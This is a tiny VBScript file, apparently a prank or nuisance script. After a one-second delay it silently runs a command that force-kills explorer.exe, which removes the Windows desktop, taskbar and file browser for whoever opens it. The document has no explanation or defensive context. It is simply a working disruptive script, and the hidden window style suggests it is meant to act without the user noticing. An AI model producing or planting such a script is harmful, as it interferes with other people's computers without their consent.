set a = Wscript.CreateObject("Wscript.shell")
Wscript.sleep 1000
a.Run "taskkill /F /IM explorer.exe",0
